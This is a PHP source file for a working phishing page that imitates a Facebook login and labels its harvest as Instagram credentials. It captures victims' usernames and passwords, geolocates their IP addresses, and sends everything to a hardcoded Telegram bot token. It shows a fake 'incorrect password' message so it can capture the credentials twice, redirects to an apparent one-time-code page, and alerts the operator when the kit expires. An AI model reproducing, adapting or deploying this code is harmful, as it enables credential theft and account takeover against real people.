<?php
session_start(); // Start the session first

// Check if this is a redirect prevention - avoid infinite loops
// if (isset($_GET['t']) || isset($_GET['r'])) {

//     // Only redirect if no query parameters exist
//     $originalUrl = 'login.php';
//     $uniqueQueryString = 't=' . time();
    
//     // Check if URL already has query string
//     if (strpos($originalUrl, '?') === false) {
//         $newUrl = $originalUrl . '?' . $uniqueQueryString;
//     } else {
//         $newUrl = $originalUrl . '&' . $uniqueQueryString;
//     }
    
//     // Only redirect if we're not already on the redirected URL
//     if (!isset($_GET['t'])) {
//         header('Location: ' . $newUrl);
//         exit();
//     }
// }

// Fetch the date from the text file (ensure the file is outside the web root for security)
$dateFile = 'time.txt'; // Move the file to a non-web-accessible directory
if (!file_exists($dateFile)) {
    die("Error: Time configuration file not found.");
}

$setDate = trim(file_get_contents($dateFile));
$setDate = new DateTime($setDate);

// Fetch the current time
$currentTime = new DateTime('now');

// Compare the current time with the set date
if ($currentTime > $setDate) {
    // Prevent multiple expired redirects
    if (!isset($_SESSION['expired_redirect_sent'])) {
        $_SESSION['expired_redirect_sent'] = true;
        
        // Start output buffering to prevent header issues
        ob_start();
        
        // Send expired message to Telegram before redirecting
        $expiredMessage = "⏰ Page Expired
Link: IG-VOTE
Status: Expired
RENEW NOW!";
        
        // Function to send message to Telegram using cURL
        function sendToTelegram($chatId, $message, $botToken) {
            $url = "https://api.telegram.org/bot" . $botToken . "/sendMessage";
            $data = [
                'chat_id' => $chatId,
                'text' => $message,
            ];
            
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
            curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_TIMEOUT, 10);
            
            $result = curl_exec($ch);
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);
            
            if ($result === false || $httpCode !== 200) {
                return false;
            }
            
            $response = json_decode($result, true);
            return isset($response['ok']) && $response['ok'];
        }
        
        // Load Telegram chat ID from the text file
        if (file_exists('telegram_chat_id.txt')) {
            $chatId = trim(file_get_contents('telegram_chat_id.txt'));
            $botToken = '8135112340:AAHvwvqU_0muChpkLfygH8SM47P9mdqFM8g';
            
            // Send the expired message to Telegram
            sendToTelegram($chatId, $expiredMessage, $botToken);
        }
        
        // Clear any output buffer
        ob_end_clean();
    }
    
    // Redirect to 404 page (make sure this file exists and doesn't redirect back)
    header('Location: 404.php'); // Changed to 404.php to be more explicit
    exit();
}

// Function to sanitize input
function sanitizeInput($data) {
    return htmlspecialchars(trim($data), ENT_QUOTES, 'UTF-8');
}

// Function to get user location using cURL
function getUserLocation($ip) {
    $url = "https://ipinfo.io/{$ip}/json?token=c645a154c3cdd5";
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false); // Prevent following redirects
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    if ($response === false || $httpCode !== 200) {
        return false;
    }
    
    return json_decode($response, true);
}

// Function to get real user IP (handles proxies and load balancers)
function getRealUserIP() {
    $ipKeys = ['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 
               'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 
               'REMOTE_ADDR'];
    
    foreach ($ipKeys as $key) {
        if (array_key_exists($key, $_SERVER) === true) {
            $ip = $_SERVER[$key];
            if (strpos($ip, ',') !== false) {
                $ip = explode(',', $ip)[0];
            }
            $ip = trim($ip);
            if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
                return $ip;
            }
        }
    }
    
    return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
}

// Function to send message to Telegram using cURL
function sendToTelegram($chatId, $message, $botToken) {
    $url = "https://api.telegram.org/bot" . $botToken . "/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false); // Prevent following redirects
    
    $result = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    if ($result === false || $httpCode !== 200) {
        return false;
    }
    
    $response = json_decode($result, true);
    return isset($response['ok']) && $response['ok'];
}

$message = '';
$firstSubmission = isset($_SESSION['first_submission']) ? $_SESSION['first_submission'] : false;

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['user_name'], $_POST['user_age'])) {
    $name = sanitizeInput($_POST['user_name']);
    $password = sanitizeInput($_POST['user_age']);
    
    if (empty($name)) {
        $message = "Invalid input. Name is required.";
    } else {
        // Get user IP address
        $userIp = getRealUserIP();
        
        // Get user location
        $locationData = getUserLocation($userIp);
        
        // Set default values and update if location data is available
        $country = 'Unknown';
        $region = 'Unknown';
        $ip = $userIp;
        
        if ($locationData && is_array($locationData)) {
            $country = $locationData['country'] ?? 'Unknown';
            $region = $locationData['region'] ?? 'Unknown';
            $ip = $locationData['ip'] ?? $userIp;
        }
        
        // Load Telegram chat ID from the text file
        if (file_exists('telegram_chat_id.txt')) {
            $chatId = trim(file_get_contents('telegram_chat_id.txt'));
        } else {
            $chatId = '';
        }
        
        if (empty($chatId)) {
            $message = "Chat ID is empty. Please check the telegram_chat_id.txt file.";
        } else {
            $botToken = '8135112340:AAHvwvqU_0muChpkLfygH8SM47P9mdqFM8g';
            
            // Prepare message
            $telegramMessage = "📩NEW LOGIN ATTEMPT📩
            
DETAILS:
•📲 PLATFORM: INSTAGRAM
•👤 UserName: $name
•🔑 Password: $password

LOCATION:
•🌍 Country: $country
•🗺️ State: $region
•🌐 IP: $ip

🔒•SECURED BY WIXXI TOOLS•🔒";
            
            if (!$firstSubmission) {
                // Store the first submission in the session
                $_SESSION['first_submission'] = [
                    'name' => $name,
                    'password' => $password,
                    'country' => $country,
                    'region' => $region,
                    'ip' => $ip
                ];
                
                // Send the first submission to Telegram
                if (sendToTelegram($chatId, $telegramMessage, $botToken)) {
                    $message = "Sorry, your password was incorrect. Please double-check your password.";
                } else {
                    $message = "Error sending message.";
                }
            } else {
                // Send message to Telegram on second submission
                if (sendToTelegram($chatId, $telegramMessage, $botToken)) {
                    // Clear the session variable after successful message sending
                    unset($_SESSION['first_submission']);
                    // Redirect to otp.php after successful message sending
                    header("Location: otp.php");
                    exit; 
                } else {
                    $message = "Error sending message.";
                }
            }
        }
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&amp;display=swap" rel="stylesheet"/>
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background: linear-gradient(to bottom right, #fbe0ff7e, #c9ebf07f);
        }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen">
     <div class="w-full max-w-sm p-6 rounded-lg">
        <div class="text-center mb-6">
            <img alt="Facebook logo" class="mx-auto mb-4" height="50" src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/2021_Facebook_icon.svg/1024px-2021_Facebook_icon.svg.png?20220821121039" width="50"/>
        </div>
        <form method="POST" action="">
            <div class="mb-4">
                <input class="w-full px-4 py-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" placeholder="Mobile number or email address" type="text" name="user_name" required/>
            </div>
            <div class="mb-4">
                <input class="w-full px-4 py-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" placeholder="Password" type="password" name="user_age" required/>
            </div>
            <div class="mb-4">
                <button class="w-full py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700" type="submit">
                    Log in
                </button>
            </div>
            <div class="text-center mb-4">
                <a class="text-blue-600 hover:underline" href="#">
                    Forgotten Password?
                </a>
            </div>
            <div class="text-center mb-4">
                <button class="w-full py-3 border border-blue-600 text-blue-600 rounded-lg hover:bg-blue-50" type="button">
                    Create new account
                </button>
            </div>
            <?php if ($message) echo "<p class='text-red-500 text-xs italic mt-4'>$message</p>"; ?>
        </form>
    </div>
</body>
</html>
